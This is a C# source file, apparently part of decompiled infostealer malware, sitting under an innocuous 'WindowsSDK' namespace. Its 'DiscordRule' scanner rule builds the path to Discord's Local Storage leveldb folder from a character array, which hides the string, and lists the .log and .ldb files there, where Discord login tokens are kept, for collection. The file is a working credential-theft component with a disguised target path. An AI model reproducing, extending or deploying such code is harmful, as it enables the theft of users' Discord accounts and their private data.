using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class DiscordRule : FileScannerRule
    {
        public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
        {
            return string.Empty;
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                string directory = Environment.ExpandEnvironmentVariables(new string(new char[39]
                {
                    '%', 'a', 'p', 'p', 'd', 'a', 't', 'a', '%', '\\',
                    'd', 'i', 's', 'c', 'o', 'r', 'd', '\\', 'L', 'o',
                    'c', 'a', 'l', ' ', 'S', 't', 'o', 'r', 'a', 'g',
                    'e', '\\', 'l', 'e', 'v', 'e', 'l', 'd', 'b'
                }));
                list.Add(new FileScannerArg
                {
                    Directory = directory,
                    Pattern = "*.log",
                    Recoursive = false
                });
                list.Add(new FileScannerArg
                {
                    Directory = directory,
                    Pattern = "*.ldb",
                    Recoursive = false
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
